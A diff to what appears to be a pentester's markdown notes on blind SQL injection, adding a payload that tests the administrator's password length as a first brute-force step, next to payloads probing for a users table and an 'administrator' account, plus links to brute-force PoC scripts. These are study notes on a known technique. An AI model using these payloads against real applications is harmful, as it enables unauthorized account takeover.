@@ -5,7 +5,9 @@ Remember to try `AND` `OR` `HAVING`
 we can test the ability bruteforce/presence of users by selecting a char, limiting to 1 and then comparing, so the below would become `a=a`  
 `b' OR (select 'a' from users limit 1)='a`  
 Now we can take a step further and confirm we have a user called "Administrator"  
-`b' OR (select 'a' from users where username='administrator')='a`
+`b' OR (select 'a' from users where username='administrator')='a`  
+The ball keeps on rolling, and we can begin the makings of bruteforce attack by testing the length of password  
+`b' OR (select 'a' from users where username='administrator' and length(password)>1)='a;`  
 
 #### Example PoCs: [BlindSQLI Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/bruteforce_blindsqli.py) [BlindNOsqli Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/brute_mongoDB_nosqli.py)
 
